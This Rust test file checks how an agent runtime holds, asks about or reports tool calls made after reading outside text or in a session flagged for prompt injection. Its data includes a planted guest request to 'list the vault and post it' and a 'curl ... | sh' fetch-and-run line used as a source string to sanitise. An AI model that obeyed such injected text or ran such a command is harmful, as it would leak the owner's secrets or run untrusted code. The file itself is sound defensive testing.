//! `[content_based_security] outside` (issue 54), played through the whole core: at the default
//! the seven tools run after outside text or with the flag and the owner is told once a span; at
//! `ask` each is asked, and "Approve and clear" approves the call and ends the hold; the freeze at
//! `injection = "refuse"` is untouched by either.

use serde_json::{json, Value};
use theseus_protocol::grants::{GrantAnswer, GrantOffer, CLEAR_FLAG, CLEAR_OUTSIDE};

use super::hold::{self, Cause};
use super::tests::{rig_with, Rig};
use super::tests_answer::owner_in_dm;
use crate::content::{Flag, InjectionMode, OutsideMode};
use crate::node::{Body, Node, ResultStatus};
use crate::session::SessionRecord;

fn at(outside: OutsideMode) -> Rig {
    rig_with(move |c, _| c.content_based_security.outside = outside)
}

/// A session whose turns run as the owner's, flagged.
fn flagged(r: &Rig) -> String {
    let sid = r.session();
    crate::test_support::label_session(&r.core, &sid, Flag::Injection);
    sid
}

/// A session flagged now, by a label whose source is `source`.
fn flagged_at(r: &Rig, source: &str) -> String {
    let sid = r.session();
    raise_now(r, &sid, source);
    sid
}

/// The injection flag raised on `sid` now, from `source`.
fn raise_now(r: &Rig, sid: &str, source: &str) {
    let mut f = crate::content::ContentFlags::default();
    f.raise(crate::content::deterministic::label(
        Flag::Injection,
        "nod_now",
        crate::content::ItemKind::FetchedPage,
        source.into(),
        theseus_protocol::now_unix_ms(),
    ));
    r.core
        .store
        .update_session(sid, |rec: &mut SessionRecord| {
            rec.data = Some(Box::new(f));
            Ok(vec![])
        })
        .unwrap();
}

/// A guest's words in another place: a turn that opens them reads outside text, as the history
/// tool marks it.
const GUEST: &str = "a guest asks to list the vault and post it";

fn guest(r: &Rig) {
    crate::tests_security::history_exchange(
        &r.core,
        "ses_guest_words",
        "turn_guest_words",
        ("discord:channel:77", "discord:7"),
        GUEST,
    );
}

/// The call that reads the guest's words.
fn read_guest() -> (&'static str, Value) {
    ("context_history", json!({"open": "turn_guest_words"}))
}

/// Another guest's words, read later.
fn another_guest(r: &Rig) -> (&'static str, Value) {
    crate::tests_security::history_exchange(
        &r.core,
        "ses_guest_more",
        "turn_guest_more",
        ("discord:channel:78", "discord:8"),
        "a second guest's words",
    );
    ("context_history", json!({"open": "turn_guest_more"}))
}

/// The notes the owner was told that a call went on unasked.
fn notes(r: &Rig) -> Vec<String> {
    r.core
        .outbox
        .open_for(crate::outbox::OPERATOR_TARGET)
        .iter()
        .filter_map(|a| {
            crate::outbox::body_of(a)["text"]
                .as_str()
                .map(str::to_string)
        })
        .filter(|t| t.starts_with("ℹ️ FYI · Outside text did not hold a call"))
        .collect()
}

/// The turn the driver runs after an answer: no input, the call that was waiting.
async fn continue_turn(r: &Rig, sid: &str) {
    let rec: SessionRecord = r.core.store.get_session(sid).unwrap().unwrap();
    let (live, _) = r.core.live_profile();
    let target = r
        .core
        .runner
        .resolve_target(&live, None, None, None)
        .unwrap();
    r.core
        .runner
        .run(crate::turn::TurnRequest {
            prompt: None,
            surface: None,
            session: rec,
            input: None,
            target,
            sink: crate::bus::EventSink::new(r.core.bus.clone(), sid, None),
            author: "test".into(),
            attachments: vec![],
            arrived: None,
            reply_to: None,
            answer_at: None,
        })
        .await
        .unwrap();
}

fn flag_of(r: &Rig, sid: &str) -> bool {
    let rec: SessionRecord = r.core.store.get_session(sid).unwrap().unwrap();
    rec.data.is_some_and(|d| d.frozen())
}

/// Each of the seven tools, with an input it takes.
fn seven() -> Vec<(&'static str, &'static str, Value)> {
    vec![
        ("config.show", "config_show", json!({"paths": ["policy"]})),
        ("look.theseus", "look_theseus", json!({})),
        ("look.vault", "look_vault", json!({})),
        ("look.work", "look_work", json!({})),
        (
            "profile.ask",
            "profile_ask",
            json!({"profile": "haiku", "question": "Say hello."}),
        ),
        ("profile.hold", "profile_hold", json!({"profile": "haiku"})),
        (
            "profile.run",
            "profile_run",
            json!({"profile": "haiku", "work": "say hello"}),
        ),
    ]
}

/// The owner's own message started the turn: what `profile.hold` acts only on.
fn the_owner_speaks(r: &Rig, sid: &str) {
    r.core.runner.tools.chat_acts.heard.stage(
        sid,
        std::time::Instant::now(),
        crate::chat_acts::Said {
            text: "go on".into(),
            who: crate::test_support::owner_cli(),
            owner_input: true,
        },
    );
}

/// Every call of `tool` in the turn ran: an Ok result, and its real effect.
fn ran(r: &Rig, sid: &str, tool: &str) {
    let results: Vec<(ResultStatus, String)> = r
        .core
        .store
        .session_nodes(sid)
        .unwrap()
        .into_iter()
        .filter_map(|(_, n)| match n.body {
            Body::ToolResult {
                tool: t,
                status,
                content,
                ..
            } if t == tool => Some((status, content)),
            _ => None,
        })
        .collect();
    // `profile.run` hands the work on and the turn waits for its report: one call, one result.
    assert!(!results.is_empty(), "{tool}: a result");
    for (status, content) in &results {
        assert_eq!(*status, ResultStatus::Ok, "{tool}: {content}");
    }
    match tool {
        "profile.ask" => assert!(!r.asked_plain().is_empty(), "the profile's model was asked"),
        "profile.hold" => assert_eq!(
            r.core.runner.sticky_profile(sid).as_deref(),
            Some("haiku"),
            "the conversation moved"
        ),
        "profile.run" => assert!(
            results[0].1.contains("Handed the work to haiku"),
            "a task was started: {}",
            results[0].1
        ),
        _ => {}
    }
}

/// At the default, each of the seven runs with the flag and after outside text, unasked, and the
/// owner is told once, by a note that names where the text came from and none of what it said.
#[tokio::test]
async fn at_the_default_each_tool_runs_unasked_and_the_owner_is_told_once() {
    for (tool, wire, input) in seven() {
        let r = at(OutsideMode::default());
        r.answers_plain("hello");
        if wire == "profile_run" {
            r.agents_report("done", None);
        }
        let sid = flagged(&r);
        the_owner_speaks(&r, &sid);
        r.steps(&sid, vec![(wire, input.clone()), (wire, input.clone())])
            .await;
        ran(&r, &sid, tool);
        assert!(
            r.asked().iter().all(|q| q.tool != tool),
            "{tool}: {:?}",
            r.asked()
        );
        let told = notes(&r);
        assert_eq!(told.len(), 1, "{tool}: one note for the span: {told:?}");
        assert!(told[0].contains("flagged"), "{}", told[0]);

        let r = at(OutsideMode::default());
        r.answers_plain("hello");
        if wire == "profile_run" {
            r.agents_report("done", None);
        }
        guest(&r);
        let sid = r.session();
        the_owner_speaks(&r, &sid);
        r.steps(
            &sid,
            vec![read_guest(), (wire, input.clone()), (wire, input)],
        )
        .await;
        ran(&r, &sid, tool);
        assert!(
            r.asked().iter().all(|q| q.tool != tool),
            "{tool}: {:?}",
            r.asked()
        );
        let told = notes(&r);
        assert_eq!(told.len(), 1, "{tool}: {told:?}");
        assert!(
            told[0].contains("from another conversation's history"),
            "the source is named by its kind: {}",
            told[0]
        );
        assert!(
            !told[0].contains(GUEST),
            "none of what it said: {}",
            told[0]
        );
        assert!(!told[0].contains("layer 1"), "{}", told[0]);
        assert!(
            told[0].contains("outside = \"ask\""),
            "the setting that asks: {}",
            told[0]
        );
    }
}

/// A span is told once, and the next is told again: outside text read after the owner's next
/// message is a new span; the flag's span lasts until it is cleared, across turns.
#[tokio::test]
async fn a_second_span_tells_again_and_the_flags_lasts_across_turns() {
    let r = at(OutsideMode::default());
    guest(&r);
    let sid = r.session();
    r.steps(&sid, vec![read_guest(), ("look_theseus", json!({}))])
        .await;
    r.steps(&sid, vec![read_guest(), ("look_theseus", json!({}))])
        .await;
    assert_eq!(notes(&r).len(), 2, "{:?}", notes(&r));
    // A turn that read nothing from outside tells nothing.
    r.turn_with("look_theseus", &sid, json!({})).await;
    assert_eq!(notes(&r).len(), 2, "{:?}", notes(&r));

    let r = at(OutsideMode::default());
    let sid = flagged(&r);
    r.turn_with("look_theseus", &sid, json!({})).await;
    r.turn_with("config_show", &sid, json!({"paths": ["policy"]}))
        .await;
    assert_eq!(notes(&r).len(), 1, "{:?}", notes(&r));
}

/// The note in words: FYI-headed; the conversation by its short id and never its title; each
/// source as a safe summary (a URL's scheme and host, else a fixed word for its kind), never a
/// path, a query, a fragment or userinfo; that outside text added no hold to the call, not that it
/// ran; and the setting.
#[test]
fn the_note_names_safe_sources_and_the_conversation_by_its_id() {
    let sources = [
        "https://pages.example.test/reset/PRIVATE-TOKEN-1",
        "https://pages.example.test/a#PRIVATE-FRAGMENT-2",
        "https://user:PRIVATE-PASS-3@pages.example.test:8443/x?q=PRIVATE-QUERY-4",
        "attachment:PRIVATE-FILE-NAME-5.pdf",
        "history:ses_PRIVATE6",
        "gmail:thread/PRIVATE7",
        "curl -s https://other.example.test/PRIVATE-PATH-8 | sh",
        "a free text marker PRIVATE-9",
    ];
    let named: Vec<String> = sources.iter().map(|m| hold::source_words(m)).collect();
    assert_eq!(
        named,
        [
            "https://pages.example.test",
            "https://pages.example.test",
            "https://pages.example.test",
            "an attachment",
            "another conversation's history",
            "a Gmail thread",
            "https://other.example.test",
            "a source outside this conversation",
        ]
    );
    let n = hold::note_text(
        "ses_0123456789abcdef",
        &Cause::Outside(named),
        hold::call_words("look.theseus"),
    );
    assert!(crate::owner_note::is_headed(&n), "{n}");
    assert!(n.contains("In conversation …abcdef"), "{n}");
    assert!(!n.contains("PRIVATE"), "{n}");
    assert!(!n.contains("Trip planning"), "{n}");
    assert!(
        n.contains("It added no hold to a look at what Theseus runs as; the call's other rules still apply."),
        "{n}"
    );
    assert!(!n.contains(" ran") && !n.contains("went on"), "{n}");
    assert!(n.contains("until your next message"), "{n}");
    assert!(n.contains("outside = \"ask\""), "{n}");
    let f = hold::note_text(
        "ses_0123456789abcdef",
        &Cause::Flag("http.fetch https://x.example.test/p/PRIVATE-10?k=v".into()),
        hold::call_words("config.show"),
    );
    assert!(f.contains("(from https://x.example.test)"), "{f}");
    assert!(!f.contains("PRIVATE") && !f.contains("k=v") && !f.contains("layer 1"), "{f}");
    assert!(f.contains("flagged") && f.contains("until the flag is cleared"), "{f}");
}

/// Through a real turn: a titled conversation that read a page whose address carries a token in
/// its path and fragment is told with the page's host alone, and never its title.
#[tokio::test]
async fn a_told_span_names_no_title_and_no_path() {
    let r = at(OutsideMode::default());
    let sid = flagged_at(&r, "https://pages.example.test/reset/PRIVATE-TOKEN#PRIVATE-FRAG");
    r.core
        .store
        .update_session(&sid, |rec: &mut SessionRecord| {
            rec.title = Some("PRIVATE-TITLE".into());
            Ok(vec![])
        })
        .unwrap();
    r.turn_with("look_theseus", &sid, json!({})).await;
    let told = notes(&r);
    assert_eq!(told.len(), 1, "{told:?}");
    assert!(told[0].contains("https://pages.example.test"), "{}", told[0]);
    assert!(!told[0].contains("PRIVATE"), "{}", told[0]);
}

/// The hold counts from the owner's message, or from the result an "Approve and clear" ran,
/// whose own mark still counts; text read after it counts again.
#[test]
fn the_hold_counts_from_a_cleared_result() {
    let mut cleared = Value::Null;
    hold::mark_cleared(&mut cleared);
    let result = |id: &str, url: Option<&str>, meta: &Value| {
        let mut n = Node::tool_result(
            "ses_a",
            None,
            None,
            Body::ToolResult {
                tool_use_id: id.into(),
                tool: "look.theseus".into(),
                status: ResultStatus::Ok,
                is_error: false,
                content: "x".into(),
                correlation_id: None,
                bytes_total: 1,
                truncated: false,
                full_ref: None,
                duration_ms: None,
                late: false,
                meta: meta.clone(),
                image: None,
                external: url.map(|u| theseus_tools::External { url: u.into() }),
                payload: None,
                parts: Vec::new(),
            },
        );
        n.id = id.into();
        n
    };
    let nodes = |v: Vec<Node>| {
        v.into_iter()
            .enumerate()
            .map(|(i, n)| (i as u64, n))
            .collect::<Vec<_>>()
    };
    let read = result("a", Some("https://pages.example.test/guide"), &Value::Null);
    let clear = result("b", None, &cleared);
    let later = result("c", Some("https://pages.example.test/guide"), &Value::Null);
    assert!(super::outside_since_owner(&nodes(vec![read.clone()])));
    assert!(!super::outside_since_owner(&nodes(vec![
        read.clone(),
        clear.clone()
    ])));
    assert!(super::outside_since_owner(&nodes(vec![
        read.clone(),
        clear,
        later
    ])));
    let own = result("d", Some("https://pages.example.test/guide"), &cleared);
    assert!(
        super::outside_since_owner(&nodes(vec![read, own])),
        "its own mark counts"
    );
}

/// At `ask` the card offers "Approve and clear" for the flag; its press removes the flag as
/// `/trust` does and approves the call, and a later call is free. A press by anyone else changes
/// nothing: the flag stays and the card waits.
#[tokio::test]
async fn at_ask_the_flags_clear_removes_it_and_a_later_call_is_free() {
    let r = at(OutsideMode::Ask);
    let sid = flagged(&r);
    r.steps(
        &sid,
        vec![
            ("look_theseus", json!({})),
            ("config_show", json!({"paths": ["policy"]})),
        ],
    )
    .await;
    let asks = r.asked();
    assert_eq!(asks.len(), 1, "{asks:?}");
    let q = &asks[0];
    assert_eq!(q.grant_offer, Some(GrantOffer::clear(true)));
    assert!(
        q.options.iter().any(|o| o.label == "Approve and clear"),
        "{:?}",
        q.options
    );
    let answer = GrantAnswer {
        pattern: CLEAR_FLAG.into(),
    };

    let e = r
        .core
        .confirm_granting(
            &q.correlation_id,
            None,
            crate::test_support::stranger(),
            &answer,
        )
        .expect_err("a stranger's press");
    assert!(!format!("{e:#}").is_empty());
    assert!(flag_of(&r, &sid), "the flag stays");
    assert_eq!(r.asked().len(), 1, "the card still waits");
    assert!(!r.core.tools.holds.take_cleared(&q.correlation_id));

    let done = r
        .core
        .confirm_granting(&q.correlation_id, None, owner_in_dm(), &answer)
        .unwrap();
    assert!(done.approved);
    assert!(!flag_of(&r, &sid), "the press removed the flag");
    assert!(
        !r.rows("content.removed").is_empty(),
        "removed as /trust removes it"
    );
    continue_turn(&r, &sid).await;
    assert_eq!(r.result(&sid).0, ResultStatus::Ok);
    assert_eq!(
        r.result_of(&sid, "p2").0,
        ResultStatus::Ok,
        "the later call ran"
    );
    assert!(
        r.asked().is_empty(),
        "the later call is free: {:?}",
        r.asked()
    );
}

/// A stale or replayed "Approve and clear" changes nothing: cleared once, a new flag raised, the
/// old answer given again is refused, and the new flag stays.
#[tokio::test]
async fn a_replayed_clear_leaves_a_new_flag() {
    let r = at(OutsideMode::Ask);
    let sid = flagged(&r);
    r.steps(&sid, vec![("look_theseus", json!({}))]).await;
    let q = r.asked().remove(0);
    let answer = GrantAnswer {
        pattern: CLEAR_FLAG.into(),
    };
    r.core
        .confirm_granting(&q.correlation_id, None, owner_in_dm(), &answer)
        .unwrap();
    assert!(!flag_of(&r, &sid), "the press removed the flag");
    continue_turn(&r, &sid).await;
    raise_now(&r, &sid, "http.fetch https://pages.example.test/again");
    assert!(flag_of(&r, &sid));
    let removed = r.rows("content.removed").len();
    let e = r
        .core
        .confirm_granting(&q.correlation_id, None, owner_in_dm(), &answer)
        .expect_err("the question no longer waits");
    assert!(format!("{e:#}").contains("not waiting"), "{e:#}");
    assert!(flag_of(&r, &sid), "the new flag stays");
    assert_eq!(r.rows("content.removed").len(), removed, "nothing removed");
}

/// The flag a clear removes is the one its question was asked under: one raised after the
/// question, while it still waits, stays.
#[tokio::test]
async fn a_clear_removes_only_the_flag_it_was_offered_for() {
    let r = at(OutsideMode::Ask);
    let sid = flagged(&r);
    r.steps(&sid, vec![("look_theseus", json!({}))]).await;
    let q = r.asked().remove(0);
    // The flag is removed elsewhere (a `/trust`), and a newer one raised, while the card waits.
    r.core
        .unlabel_session(&sid, "injection", owner_in_dm())
        .unwrap();
    raise_now(&r, &sid, "http.fetch https://pages.example.test/newer");
    r.core
        .confirm_granting(
            &q.correlation_id,
            None,
            owner_in_dm(),
            &GrantAnswer {
                pattern: CLEAR_FLAG.into(),
            },
        )
        .unwrap();
    assert!(flag_of(&r, &sid), "the newer flag stays");
}

/// At `ask`, outside text's card offers "Approve and clear"; its press ends the hold as if the
/// owner had spoken: a later call is free, and one after new outside text is asked again.
#[tokio::test]
async fn at_ask_outside_texts_clear_ends_the_hold_until_more_is_read() {
    for more in [false, true] {
        let r = at(OutsideMode::Ask);
        guest(&r);
        let later = another_guest(&r);
        let sid = r.session();
        let mut steps = vec![read_guest(), ("look_theseus", json!({}))];
        if more {
            steps.push(later);
        }
        steps.push(("look_work", json!({})));
        r.steps(&sid, steps).await;
        let q = r.asked().remove(0);
        assert_eq!(q.tool, "look.theseus");
        assert_eq!(q.grant_offer, Some(GrantOffer::clear(false)));
        r.core
            .confirm_granting(
                &q.correlation_id,
                None,
                owner_in_dm(),
                &GrantAnswer {
                    pattern: CLEAR_OUTSIDE.into(),
                },
            )
            .unwrap();
        continue_turn(&r, &sid).await;
        let results: Vec<(String, bool)> = r
            .core
            .store
            .session_nodes(&sid)
            .unwrap()
            .into_iter()
            .filter_map(|(_, n)| match &n.body {
                Body::ToolResult { tool, meta, .. } => {
                    Some((tool.clone(), meta[hold::CLEARED] == true))
                }
                _ => None,
            })
            .collect();
        assert!(
            results.contains(&("look.theseus".into(), true)),
            "the approved call's result is the boundary: {results:?}"
        );
        let asks = r.asked();
        match more {
            false => {
                assert!(asks.is_empty(), "free after the press: {asks:?}");
                assert!(results.iter().any(|(t, _)| t == "look.work"), "{results:?}");
            }
            true => {
                assert_eq!(asks.len(), 1, "{asks:?}");
                assert_eq!(asks[0].tool, "look.work");
            }
        }
    }
}

/// The freeze at `injection = "refuse"` refuses each of the nine in a flagged session at both
/// `outside` settings, as it did before: nothing is asked, nothing is told, nothing is written.
#[tokio::test]
async fn the_freeze_refuses_all_nine_at_both_settings() {
    let mut nine = seven();
    nine.push((
        "vault.use",
        "vault_use",
        json!({"vault": "Harbor", "item": "Lantern key", "field": "credential",
               "name": "lantern_key", "reason": "the key"}),
    ));
    nine.push((
        "vault.keep",
        "vault_keep",
        json!({"vault": "Harbor", "title": "Lantern new", "field": "credential",
               "purpose": "the key"}),
    ));
    for outside in [OutsideMode::Notify, OutsideMode::Ask] {
        for (tool, wire, input) in &nine {
            let r = rig_with(move |c, _| {
                c.content_based_security.outside = outside;
                c.content_based_security.injection = InjectionMode::Refuse;
            });
            let sid = flagged(&r);
            the_owner_speaks(&r, &sid);
            r.turn_with(wire, &sid, input.clone()).await;
            let (status, text) = r.result(&sid);
            assert_ne!(status, ResultStatus::Ok, "{outside:?} {tool}: {text}");
            assert!(text.contains("this session is holding"), "{tool}: {text}");
            assert!(r.asked().is_empty(), "{tool}: {:?}", r.asked());
            assert!(notes(&r).is_empty(), "{tool}: {:?}", notes(&r));
            assert_eq!(r.file_text(), super::tests::FILE, "{tool}");
        }
    }
}

/// `outside` takes `notify` or `ask` and nothing else, at a settings change too.
#[tokio::test]
async fn an_unknown_outside_is_refused_at_a_settings_change() {
    let r = at(OutsideMode::default());
    let sid = r.session();
    r.turn(
        &sid,
        json!({"changes": [{"path": "content_based_security.outside", "value": "loud"}],
               "reason": "x"}),
    )
    .await;
    let (status, text) = r.result(&sid);
    assert_eq!(status, ResultStatus::Error, "{text}");
    assert!(
        text.contains("do not load") && text.contains("loud"),
        "{text}"
    );
    assert!(r.asked().is_empty());
    let e = format!(
        "{:#}",
        crate::Config::parse(
            "[secrets]\nanthropic_api_key = \"env:A\"\n[content_based_security]\noutside = \"loud\"\n"
        )
        .unwrap_err()
    );
    assert!(e.contains("loud"), "{e}");
}
